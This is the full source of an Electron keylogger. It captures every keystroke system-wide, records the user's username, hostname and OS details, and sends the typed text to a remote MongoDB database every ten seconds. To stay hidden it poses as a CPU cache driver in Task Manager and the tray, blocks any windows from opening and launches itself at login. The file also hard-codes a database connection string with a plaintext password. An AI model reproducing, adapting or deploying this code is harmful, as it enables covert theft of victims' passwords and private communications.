const { app, Tray, Menu,BrowserWindow  } = require('electron');
const { uIOhook, UiohookKey } = require('uiohook-napi');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const os = require('os'); // To fetch system information
const appName = 'cpu-cache-m-driver'; // The application name you want to display in Task Manager
app.setName(appName); // Set the application name



// Prevent BrowserWindow creation globally within the app, you can override it at runtime by mocking the API

BrowserWindow.prototype.constructor = function () {
    console.log('BrowserWindow creation blocked!');
    return null;
  };


// MongoDB Connection
const MONGODB_URI = 'mongodb+srv://manish9211:MaNiSh9211@cluster9211.be3bfds.mongodb.net/keylogger';

mongoose.connect(MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch((err) => console.error('MongoDB connection error:', err));

// Define the schema and model
const KeyLogSchema = new mongoose.Schema({
    deviceInfo: {
        username: String,
        hostname: String,
        platform: String,
        arch: String,
        osType: String,
        release: String,
    },
    loggedKeys: { type: String, default: '' },
    lastTimestamp: { type: Date, default: Date.now },
});

const KeyLog = mongoose.model('KeyLog', KeyLogSchema);

let isShiftPressed = false;
let isCapsLockOn = false;
const logFilePath = path.join(app.getPath('userData'), 'keylogs.txt');
const tempFilePath = path.join(app.getPath('userData'), 'keylogs_temp.txt');

// Fetch device information
const deviceInfo = {
    username: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    osType: os.type(),
    release: os.release(),
};

// Keycode mapping
const keyCodeToChar = {
    [UiohookKey.A]: { normal: 'a', shift: 'A' },
        [UiohookKey.B]: { normal: 'b', shift: 'B' },
        [UiohookKey.C]: { normal: 'c', shift: 'C' },
        [UiohookKey.D]: { normal: 'd', shift: 'D' },
        [UiohookKey.E]: { normal: 'e', shift: 'E' },
        [UiohookKey.F]: { normal: 'f', shift: 'F' },
        [UiohookKey.G]: { normal: 'g', shift: 'G' },
        [UiohookKey.H]: { normal: 'h', shift: 'H' },
        [UiohookKey.I]: { normal: 'i', shift: 'I' },
        [UiohookKey.J]: { normal: 'j', shift: 'J' },
        [UiohookKey.K]: { normal: 'k', shift: 'K' },
        [UiohookKey.L]: { normal: 'l', shift: 'L' },
        [UiohookKey.M]: { normal: 'm', shift: 'M' },
        [UiohookKey.N]: { normal: 'n', shift: 'N' },
        [UiohookKey.O]: { normal: 'o', shift: 'O' },
        [UiohookKey.P]: { normal: 'p', shift: 'P' },
        [UiohookKey.Q]: { normal: 'q', shift: 'Q' },
        [UiohookKey.R]: { normal: 'r', shift: 'R' },
        [UiohookKey.S]: { normal: 's', shift: 'S' },
        [UiohookKey.T]: { normal: 't', shift: 'T' },
        [UiohookKey.U]: { normal: 'u', shift: 'U' },
        [UiohookKey.V]: { normal: 'v', shift: 'V' },
        [UiohookKey.W]: { normal: 'w', shift: 'W' },
        [UiohookKey.X]: { normal: 'x', shift: 'X' },
        [UiohookKey.Y]: { normal: 'y', shift: 'Y' },
        [UiohookKey.Z]: { normal: 'z', shift: 'Z' },
    
        [2]: { normal: '1', shift: '!' },
        [3]: { normal: '2', shift: '@' },
        [4]: { normal: '3', shift: '#' },
        [5]: { normal: '4', shift: '$' },
        [6]: { normal: '5', shift: '%' },
        [7]: { normal: '6', shift: '^' },
        [8]: { normal: '7', shift: '&' },
        [9]: { normal: '8', shift: '*' },
        [10]: { normal: '9', shift: '(' },
        [11]: { normal: '0', shift: ')' },
        [12]: { normal: '-', shift: '_' },
        [13]: { normal: '=', shift: '+' },
    
        [26]: { normal: '[', shift: '{' },
        [27]: { normal: ']', shift: '}' },
        [43]: { normal: '\\', shift: '|' },
    
        [39]: { normal: ';', shift: ':' },
        [40]: { normal: '\'', shift: '"' },
        [51]: { normal: ',', shift: '<' },
        [52]: { normal: '.', shift: '>' },
        [53]: { normal: '/', shift: '?' },
        [57]: { normal: ' ', shift: ' ' },
        [28]: { normal: '\n', shift: '\n' },
    
    // Special keys
    [14]: { normal: '\b', shift: '\b' }, // Backspace
    [57]: { normal: ' ', shift: ' ' },   // Space
    [28]: { normal: '\n', shift: '\n' }, // Enter

    // Numpad keys
    [82]: { normal: '0' },
    [79]: { normal: '1' },
    [80]: { normal: '2' },
    [81]: { normal: '3' },
    [75]: { normal: '4' },
    [76]: { normal: '5' },
    [77]: { normal: '6' },
    [71]: { normal: '7' },
    [72]: { normal: '8' },
    [73]: { normal: '9' },

    // Special symbols (/ * - + .)
    [3637]: { normal: '/' }, // /
    [55]: { normal: '*' },   // *
    [74]: { normal: '-' },   // -
    [78]: { normal: '+' },   // +
    [83]: { normal: '.' },   // .
};

function createTray() {
    const trayIcon = path.join(__dirname, 'cpu.ico'); // Tray icon image
    const tray = new Tray(trayIcon);

    const contextMenu = Menu.buildFromTemplate([
        {
            label: 'Quit',
            click: () => {
                app.quit();
            }
        }
    ]);

    tray.setToolTip('CPU Catching Driver');
    tray.setContextMenu(contextMenu);
}

function saveToFile(data) {
    fs.appendFileSync(logFilePath, data, 'utf8');
}

async function syncFileToMongoDB() {
    if (fs.existsSync(logFilePath)) {
        const data = fs.readFileSync(logFilePath, 'utf8');
        if (data.trim()) {
            try {
                fs.renameSync(logFilePath, tempFilePath); // Move data to temp file
                const currentData = fs.readFileSync(tempFilePath, 'utf8');
                let existingLog = await KeyLog.findOne({ deviceInfo });

                if (existingLog) {
                    existingLog.loggedKeys += currentData;
                    existingLog.lastTimestamp = new Date();
                    await existingLog.save();
                } else {
                    const keyLog = new KeyLog({
                        deviceInfo,
                        loggedKeys: currentData,
                        lastTimestamp: new Date(),
                    });
                    await keyLog.save();
                }

                console.log('Data synced to MongoDB');
                fs.unlinkSync(tempFilePath); // Remove temp file after sync
            } catch (err) {
                console.error('Error syncing data to MongoDB:', err);
                fs.appendFileSync(logFilePath, fs.readFileSync(tempFilePath, 'utf8')); // Restore unsynced data
                fs.unlinkSync(tempFilePath);
            }
        }
    }
}

uIOhook.on('keydown', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = true;
        return;
    }
    if (e.keycode === 58) {
        isCapsLockOn = !isCapsLockOn;
        return;
    }

    const keyMapping = keyCodeToChar[e.keycode];
    if (keyMapping) {
        let key = keyMapping.normal;

        if (isShiftPressed) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && !isShiftPressed && /[a-z]/.test(keyMapping.normal)) {
            key = keyMapping.shift || keyMapping.normal;
        }
        if (isCapsLockOn && isShiftPressed && /[A-Z]/.test(keyMapping.shift)) {
            key = keyMapping.normal; // Correct handling for CapsLock + Shift
        }

        saveToFile(key);
    }
});

uIOhook.on('keyup', (e) => {
    if (e.keycode === 42 || e.keycode === 54) {
        isShiftPressed = false;
    }
});

uIOhook.start();

app.whenReady().then(() => {
    createTray(); // Create the tray icon for background process
    setInterval(syncFileToMongoDB, 10000); // Sync every 10 seconds
});

// Automatically start the app when the user logs in or turns on the laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: process.execPath, // This is the path of the current app's executable
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});
